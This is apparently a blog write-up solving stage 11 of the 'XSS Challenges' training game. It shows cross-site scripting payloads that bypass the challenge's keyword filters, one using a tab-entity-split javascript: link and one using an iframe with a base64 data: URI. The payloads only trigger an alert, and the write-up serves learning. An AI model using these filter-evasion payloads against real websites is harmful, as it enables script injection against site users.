# **XSS Challenges Stage 11**

In hints, let's see...
```
"s/script/xscript/ig;" and "s/on\[a-z\]+=/onxxx=/ig;" and "s/style=/stxxx=/ig;"
```

This time's replacement is not for less but for more.

So, we need to find something will not execute and will ignored by HTML element.

![](https://i.imgur.com/1FMBwRh.png)

[This post](https://xsses.rocks/sample-page/) may be helpful.

```
"><a href="javascr&#09;ipt:alert(document.domain)">
```

![](https://i.imgur.com/1NQSWGg.png)

Press those leaving characters `">` to execute the herf.

![](https://i.imgur.com/KQiC3OS.png)

**※Here I got a interesting solution of this question.**

To bypass this kind's WAF, we can use the HTML data which is encode but can be executed.

The method to make this happen is [“fake” the src attribute of an iframe](https://stackoverflow.com/questions/3462758/is-it-possible-to-fake-the-src-attribute-of-an-iframe/3462800#3462800).

Yup, the payload's format should be like:

```
<iframe src="data:text/html;base64, .... base64 encoded HTML data ....">
```

Let's simply encode the main paylaod:

```
<a onmouseover="alert(document.domain)">123
```

into base64 encoded.

Then finish the fianl payload:

```
"><iframe src="data:text/html;base64,PGEgb25tb3VzZW92ZXI9ImFsZXJ0KGRvY3VtZW50LmRvbWFpbikiPjEyMw=="></iframe>
```

With this payload, you still can execute javascipt in the page's iframe but parent page, so you can't `alert(document.domain)` of parent page, cuz to browser will block this lind of XXS.

![](https://i.imgur.com/Xds3KKO.png)
